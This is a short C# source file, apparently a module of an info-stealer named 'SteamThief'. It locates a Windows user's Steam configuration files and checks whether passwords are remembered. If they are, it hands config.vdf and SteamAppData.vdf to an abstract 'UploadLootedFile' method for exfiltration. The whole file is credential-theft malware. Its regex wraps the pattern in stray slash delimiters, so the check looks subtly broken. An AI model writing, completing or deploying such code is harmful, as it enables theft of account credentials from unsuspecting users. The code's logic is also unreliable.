using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SteamThief
{
    public abstract class SteamThief
    {
        public const string SteamAppData = "SteamAppData.vdf";
        public const string SteamConfig = "config.vdf";
        
        public static string ProgramFilesX86()
        {
            if (8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))) || Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") == "AMD64")
            {
                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
            }
            return Environment.GetEnvironmentVariable("ProgramFiles");
        }
        
        public abstract void UploadLootedFile(byte[] Data, string FileName);

        public bool Collect()
        {
            string SteamConfigPath = Path.Combine(ProgramFilesX86(), "Steam", "config");
            string ConfigPath = Path.Combine(SteamConfigPath, SteamConfig);
            string AppDataPath = Path.Combine(SteamConfigPath, SteamAppData);
            if(File.Exists(ConfigPath) && File.Exists(AppDataPath))
            {
                string SteamAppDataContent = File.ReadAllText(AppDataPath);
                if(Regex.IsMatch(SteamAppDataContent, "/RememberPassword\\W*\"1\"/"))
                {
                    UploadLootedFile(File.ReadAllBytes(AppDataPath), SteamAppData);
                    UploadLootedFile(File.ReadAllBytes(ConfigPath), SteamConfig);
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
}
